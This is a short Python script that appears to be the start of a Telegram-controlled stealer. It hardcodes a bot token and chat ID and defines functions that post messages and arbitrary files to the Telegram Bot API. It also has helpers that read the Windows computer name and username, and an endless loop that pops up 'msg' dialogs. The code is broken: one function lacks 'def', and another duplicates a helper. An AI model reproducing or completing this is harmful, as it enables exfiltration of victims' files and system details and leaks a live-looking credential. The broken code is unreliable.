#don't delete
import requests
import subprocess
import os
import tempfile
import importlib.util
import string
import time
import sys

chat_id = "-4102145810"
token = "6653447632:AAEHVkyZH-TFa9141etCM1wmPyJ9rCXuASA"

def send_message(chat_id, token, message):
    r = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}")

def send_file(chat_id, token, filepath):
    data = {'chat_id' : chat_id}
    with open(filepath, 'rb') as file:
        files = {
            'document': file.read()
        }
    r = requests.post(f"https://api.telegram.org/bot{token}/sendDocument", data=data, files=files)

def get_computer_name():
    computer_name = subprocess.check_output(["echo", "%COMPUTERNAME%"], shell=True, text=True).strip()
    return computer_name

def get_username():
    username = subprocess.check_output(["echo", "%username%"], shell=True, text=True).strip()
    return username

get_whoami():
    whoami = subprocess.check_output(["echo", "%username%"], shell=True, text=True).strip()
    return whoami

while True:
    whoami = get_whoami()
    os.system(f"msg * result:{str(whoami)}")
    time.sleep(5)